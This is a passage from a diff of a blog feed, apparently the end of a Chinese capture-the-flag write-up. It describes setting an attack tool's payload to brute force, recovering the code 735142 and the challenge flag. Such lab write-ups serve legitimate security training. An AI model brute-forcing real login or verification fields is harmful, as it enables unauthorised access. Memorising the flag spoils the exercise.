+<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
+<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
+<p>等待一段时间后，得到爆破结果<code>735142</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022050545.png"></p>
+<p>得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
